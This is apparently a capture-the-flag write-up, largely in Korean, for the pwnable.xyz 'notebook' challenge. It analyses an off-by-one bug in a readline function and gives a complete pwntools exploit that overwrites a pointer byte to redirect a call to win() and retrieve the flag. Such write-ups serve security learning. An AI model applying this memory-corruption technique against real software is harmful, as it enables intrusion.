# [pwnable.xyz] notebook

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> How many vulns does this one have?
>
> Release: [notebook.zip](https://github.com/h0meb0dy/pwnable.xyz/files/9101128/notebook.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/178709701-41c728a2-cc20-4b99-9440-754249a040f1.png)

## Analysis

### `struct Note`

![image](https://user-images.githubusercontent.com/104156058/178924405-27aa3b9f-4e32-451f-8b92-d63857497c5b.png)

### Vulnerability

```c
unsigned __int64 __fastcall readline(char *start, int len, char end)
{
  char buf; // [rsp+13h] [rbp-Dh] BYREF
  int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  for ( i = 0; i < len; ++i )
  {
    read(0, &buf, 1uLL);
    if ( buf == end )
      break;
    start[i] = buf;
  }
  start[i] = buf;                               // off-by-one
  return __readfsqword(0x28u) ^ v7;
}
```

`read_line()`에서 `i == len`이 되어 반복문을 빠져나오고 나서 `start[i] = buf;`를 한 번 더 실행한다. 즉 `start[len] = buf;`가 되어 off-by-one 취약점이 발생한다.

## Exploit

```c
      case 4:
        printf("Notebook name: ");
        readline(nbook, 0x80, '\n');
        break;
```

![image](https://user-images.githubusercontent.com/104156058/178924293-07559e1d-d22c-40e5-a33f-9fe3c9bb608f.png)

`readline()`의 off-by-one 취약점을 이용하여 전역 변수 `nbook`의 바로 뒤에 있는 `ptr`의 1바이트를 원하는 값으로 변조할 수 있다. `content`의 앞쪽 8바이트에 `win()`의 주소를 써놓고, `ptr`에 저장된 `Note` 청크의 주소에서 1바이트를 변조하여 `content` 청크의 주소로 만들면, `edit_note()`에서 `ptr->getSizeFunc`가 호출될 때 `win()`이 대신 호출되어 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30035)

sla = r.sendlineafter
sa = r.sendafter

def make(size, title, note):
    sla('> ', '1')
    sla('size: ', str(size))

    if len(title) < size:
        sla('Title: ', title)
    else:
        sa('Title: ', title)
        
    if len(note) < size:
        sla('Note: ', note)
    else:
        sa('Note: ', note)

def edit(note):
    sla('> ', '2')
    sla('note: ', note)

def delete():
    sla('> ', '3')

def rename(name):
    sla('> ', '4')
    
    if len(name) < 0x80:
        sla('Notebook name: ', name)
    else:
        sa('Notebook name: ', name)

win = 0x40092c

sla('Name your notebook: ', 'A')

make(0x38, 'A', p64(win) + b'A' * 0x30)
rename('\x50' * 0x80)
sla('> ', '2') # call win()

r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30035: Done
[*] Switching to interactive mode
note: FLAG{0ff_by1_ch3cked}
```